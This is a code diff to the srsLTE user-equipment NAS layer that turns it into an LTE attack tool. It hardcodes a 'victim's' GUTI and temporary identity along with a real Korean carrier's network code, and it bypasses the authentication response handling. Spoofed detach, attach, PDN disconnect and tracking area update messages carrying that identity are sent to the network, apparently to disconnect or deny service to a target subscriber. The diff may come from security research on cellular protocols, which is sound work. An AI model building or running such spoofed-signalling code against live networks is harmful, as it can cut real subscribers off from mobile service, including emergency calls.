@@ -158,11 +158,17 @@ proc_outcome_t nas::rrc_connect_proc::init(srslte::establishment_cause_t cause_,
     if (nas_ptr->state == EMM_STATE_REGISTERED) {
       nas_ptr->gen_service_request(pdu);
     } else {
-      nas_ptr->gen_attach_request(pdu);
+      nas_ptr->nas_log->console("RRC Connection Init : state != EMM_STATE_REGISTERED\n");
+      // nas_ptr->gen_attach_request(pdu);
+      // nas_ptr->send_detach_request(true);
     }
   }
 
   // Provide UE-Identity to RRC if have one
+  // MODIFIED
+  nas_ptr->have_guti = true;
+  nas_ptr->ctxt.guti.mme_code = 0x11;
+  nas_ptr->ctxt.guti.m_tmsi = 0xd0215dee;
   if (nas_ptr->have_guti) {
     srslte::s_tmsi_t s_tmsi;
     s_tmsi.mmec   = nas_ptr->ctxt.guti.mme_code;
@@ -184,6 +190,7 @@ proc_outcome_t nas::rrc_connect_proc::step()
   if (state != state_t::wait_attach) {
     return proc_outcome_t::yield;
   }
+  // nas_ptr->nas_log->console("RRC Connection Step\n");
   // Wait until attachment. If doing a service request is already attached
   if (not nas_ptr->running) {
     ProcError("NAS stopped running\n");
@@ -221,6 +228,14 @@ proc_outcome_t nas::rrc_connect_proc::react(nas::rrc_connect_proc::connection_re
   if (state == state_t::conn_req and event.outcome) {
     ProcInfo("Connection established correctly. Waiting for Attach\n");
     // Wait until attachment. If doing a service request is already attached
+    nas_ptr->nas_log->console("RRC Connection React : Connection established + PDN Discon\n");
+    // nas_ptr->send_pdn_disconnect_request();
+    // nas_ptr->send_detach_request(false);
+    nas_ptr->send_attach_request();
+    // nas_ptr->send_security_mode_reject(LIBLTE_MME_EMM_CAUSE_ILLEGAL_UE);
+    // nas_ptr->send_detach_accept();
+    // nas_ptr->send_service_request();
+    // nas_ptr->send_tracking_area_update_request();
     state = state_t::wait_attach;
     timeout_timer.run();
     return proc_outcome_t::yield;
@@ -259,7 +274,8 @@ void nas::init(usim_interface_nas* usim_, rrc_interface_nas* rrc_, gw_interface_
     nas_log->error("Getting Home PLMN Id from USIM. Defaulting to 001-01\n");
     //MODIFIED
     //home_plmn.from_number(61441, 65281); // This is 001 01
-    home_plmn.from_number(62544, 65288); // This is KT (450 08)
+    // home_plmn.from_number(62544, 65288); // This is KT (450 08)
+    home_plmn.from_number(62544, 65285); // This is SKT (450 05)
   }
 
   // parse and sanity check EIA list
@@ -1343,28 +1359,26 @@ void nas::parse_authentication_request(uint32_t lcid, unique_byte_buffer_t pdu, 
   }
 
   //MODIFIED
-  send_detach_request(false);
+  send_detach_request(true);
   nas_log->console("Send NAS Detach Request before authentication response!\n");
 
-  /*
-  if (auth_result == AUTH_OK) {
-    nas_log->info("Network authentication successful\n");
-    // MME wants to re-establish security context, use provided protection level until security (re-)activation
-    current_sec_hdr = sec_hdr_type;
-
-    send_authentication_response(res, res_len);
-    nas_log->info_hex(ctxt.k_asme, 32, "Generated k_asme:\n");
-    set_k_enb_count(0);
-    auth_request = true;
-  } else if (auth_result == AUTH_SYNCH_FAILURE) {
-    nas_log->error("Network authentication synchronization failure.\n");
-    send_authentication_failure(LIBLTE_MME_EMM_CAUSE_SYNCH_FAILURE, res);
-  } else {
-    nas_log->warning("Network authentication failure\n");
-    nas_log->console("Warning: Network authentication failure\n");
-    send_authentication_failure(LIBLTE_MME_EMM_CAUSE_MAC_FAILURE, nullptr);
-  }
-  */
+  // if (auth_result == AUTH_OK) {
+  //   nas_log->info("Network authentication successful\n");
+  //   // MME wants to re-establish security context, use provided protection level until security (re-)activation
+  //   current_sec_hdr = sec_hdr_type;
+  //
+  //   send_authentication_response(res, res_len);
+  //   nas_log->info_hex(ctxt.k_asme, 32, "Generated k_asme:\n");
+  //   set_k_enb_count(0);
+  //   auth_request = true;
+  // } else if (auth_result == AUTH_SYNCH_FAILURE) {
+  //   nas_log->error("Network authentication synchronization failure.\n");
+  //   send_authentication_failure(LIBLTE_MME_EMM_CAUSE_SYNCH_FAILURE, res);
+  // } else {
+  //   nas_log->warning("Network authentication failure\n");
+  //   nas_log->console("Warning: Network authentication failure\n");
+  //   send_authentication_failure(LIBLTE_MME_EMM_CAUSE_MAC_FAILURE, nullptr);
+  // }
 }
 
 void nas::parse_authentication_reject(uint32_t lcid, unique_byte_buffer_t pdu)
@@ -1794,9 +1808,20 @@ void nas::gen_attach_request(srslte::unique_byte_buffer_t& msg)
   attach_req.old_guti_type_present                          = false;
 
   // ESM message (PDN connectivity request) for first default bearer
+  // MODIFIED
   gen_pdn_connectivity_request(&attach_req.esm_msg);
+  // nas_log->console("Generate PDN Disconnect Request Msg\n");
+  // gen_pdn_disconnect_request(&attach_req.esm_msg);
 
   // GUTI or IMSI attach
+  // MODIFIED - always have guti and ctxt with victim's ID
+  have_guti = true;
+  have_ctxt = true;
+  ctxt.guti.m_tmsi = 0xd0215dee;
+  ctxt.guti.mcc = 5;
+  ctxt.guti.mnc = 450;
+  ctxt.guti.mme_group_id = 0x8001;
+  ctxt.guti.mme_code = 0x11;
   if (have_guti && have_ctxt) {
     nas_log->console("UE has GUTI and ctxt\n");
     attach_req.tmsi_status_present      = true;
@@ -1831,6 +1856,7 @@ void nas::gen_attach_request(srslte::unique_byte_buffer_t& msg)
       return;
     }
   } else {
+    nas_log->console("IMSI Attach Request~\n");
     attach_req.eps_mobile_id.type_of_id = LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI;
     attach_req.nas_ksi.tsc_flag         = LIBLTE_MME_TYPE_OF_SECURITY_CONTEXT_FLAG_NATIVE;
     attach_req.nas_ksi.nas_ksi          = LIBLTE_MME_NAS_KEY_SET_IDENTIFIER_NO_KEY_AVAILABLE;
@@ -1862,6 +1888,9 @@ void nas::gen_attach_request(srslte::unique_byte_buffer_t& msg)
   // start T3410
   nas_log->debug("Starting T3410\n");
   t3410.run();
+  // MODIFIED
+  // nas_log->console("Send security mode reject\n");
+  // send_security_mode_reject(LIBLTE_MME_EMM_CAUSE_ILLEGAL_UE);
 }
 
 void nas::gen_service_request(srslte::unique_byte_buffer_t& msg)
@@ -1939,6 +1968,28 @@ void nas::gen_pdn_connectivity_request(LIBLTE_BYTE_MSG_STRUCT* msg)
   liblte_mme_pack_pdn_connectivity_request_msg(&pdn_con_req, msg);
 }
 
+// MODIFIED
+void nas::gen_pdn_disconnect_request(unique_byte_buffer_t& msg)
+{
+  LIBLTE_MME_PDN_DISCONNECT_REQUEST_MSG_STRUCT pdn_discon_req = {};
+
+  pdn_discon_req.eps_bearer_id = 0x00;
+  pdn_discon_req.proc_transaction_id = 0x01;
+  pdn_discon_req.linked_eps_bearer_id = 0x00;
+
+  pdn_discon_req.protocol_cnfg_opts_present = false;
+
+  liblte_mme_pack_pdn_disconnect_request_msg(&pdn_discon_req, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
+}
+
+void nas::send_pdn_disconnect_request()
+{
+  unique_byte_buffer_t pdu = srslte::allocate_unique_buffer(*pool, true);
+  nas_log->console("Send PDN Discon Request\n");
+  gen_pdn_disconnect_request(pdu);
+  rrc->write_sdu(std::move(pdu));
+}
+
 void nas::send_security_mode_reject(uint8_t cause)
 {
   unique_byte_buffer_t msg = srslte::allocate_unique_buffer(*pool, true);
@@ -1967,8 +2018,11 @@ void nas::send_attach_request()
     nas_log->error("Fatal Error: Couldn't allocate PDU in %s().\n", __FUNCTION__);
     return;
   }
+  // MODIFIED - Immediately send detach request
+  nas_log->console("send attach request - MODIFIED\n");
   gen_attach_request(pdu);
   rrc->write_sdu(std::move(pdu));
+  // send_detach_request(false);
 }
 
 void nas::send_detach_request(bool switch_off)
@@ -1993,11 +2047,19 @@ void nas::send_detach_request(bool switch_off)
   ctxt      = {};
   ctxt.ksi  = LIBLTE_MME_NAS_KEY_SET_IDENTIFIER_NO_KEY_AVAILABLE;
   // GUTI or IMSI detach
+  // MODIFIED
+  have_guti = true;
+  have_ctxt = true;
   if (have_guti && have_ctxt) {
     detach_request.eps_mobile_id.type_of_id = LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI;
     memcpy(&detach_request.eps_mobile_id.guti, &ctxt.guti, sizeof(LIBLTE_MME_EPS_MOBILE_ID_GUTI_STRUCT));
     detach_request.nas_ksi.tsc_flag = LIBLTE_MME_TYPE_OF_SECURITY_CONTEXT_FLAG_NATIVE;
     detach_request.nas_ksi.nas_ksi  = LIBLTE_MME_NAS_KEY_SET_IDENTIFIER_NO_KEY_AVAILABLE;
+    detach_request.eps_mobile_id.guti.mme_code = 0x11;
+    detach_request.eps_mobile_id.guti.m_tmsi = 0xd0215dee;
+    detach_request.eps_mobile_id.guti.mcc = 5;
+    detach_request.eps_mobile_id.guti.mnc = 450;
+    detach_request.eps_mobile_id.guti.mme_group_id = 0x8001;
     nas_log->info("Sending detach request with GUTI\n"); // If sent as an Initial UE message, it cannot be ciphered
     nas_log->console("Send NAS Detach Request with GUTI : 0x%x%x\n", detach_request.eps_mobile_id.guti.mme_code, detach_request.eps_mobile_id.guti.m_tmsi);
     liblte_mme_pack_detach_request_msg(
@@ -2017,6 +2079,7 @@ void nas::send_detach_request(bool switch_off)
     detach_request.nas_ksi.nas_ksi          = 0;
     usim->get_imsi_vec(detach_request.eps_mobile_id.imsi, 15);
     nas_log->info("Sending detach request with IMSI\n");
+    nas_log->console("Send NAS Detach Request with IMSI\n");
     liblte_mme_pack_detach_request_msg(
         &detach_request, current_sec_hdr, ctxt.tx_count, (LIBLTE_BYTE_MSG_STRUCT*)pdu.get());
 
@@ -2037,8 +2100,10 @@ void nas::send_detach_request(bool switch_off)
   }
 
   if (rrc->is_connected()) {
+    nas_log->console("RRC connected during NAS Detach Request\n");
     rrc->write_sdu(std::move(pdu));
   } else {
+    nas_log->console("RRC not connected during NAS Detach Request!!\n");
     if (not rrc_connector.launch(establishment_cause_t::mo_sig, std::move(pdu))) {
       nas_log->error("Failed to initiate RRC Connection Request\n");
     }
@@ -2237,6 +2302,38 @@ void nas::send_service_request()
   }
 
   nas_log->info("Sending service request\n");
+  rrc->write_sdu(std::move(msg));
+  ctxt.tx_count++;
+}
+
+// MODIFIED - Tracking Area Update Request
+void nas::send_tracking_area_update_request()
+{
+  unique_byte_buffer_t msg = srslte::allocate_unique_buffer(*pool, true);
+  if (!msg) {
+    nas_log->error("Fatal Error: Couldn't allocate PDU in send_tracking_area_update_request().\n");
+  }
+
+  // Pack the service request message directly
+  msg->msg[0] = (LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS << 4u) | (LIBLTE_MME_PD_EPS_MOBILITY_MANAGEMENT);
+  msg->N_bytes++;
+  // msg->msg[1] = (ctxt.ksi & 0x07u) << 5u;
+  // msg->msg[1] |= ctxt.tx_count & 0x1Fu;
+  msg->N_bytes++;
+
+  uint8_t mac[4];
+  // integrity_generate(&k_nas_int[16], ctxt.tx_count, SECURITY_DIRECTION_UPLINK, &msg->msg[0], 2, &mac[0]);
+  // Set the short MAC
+  // msg->msg[2] = mac[2];
+  // msg->N_bytes++;
+  // msg->msg[3] = mac[3];
+  // msg->N_bytes++;
+
+  if (pcap != nullptr) {
+    pcap->write_nas(msg->msg, msg->N_bytes);
+  }
+
+  nas_log->info("Sending tracking area update request\n");
   rrc->write_sdu(std::move(msg));
   ctxt.tx_count++;
 }
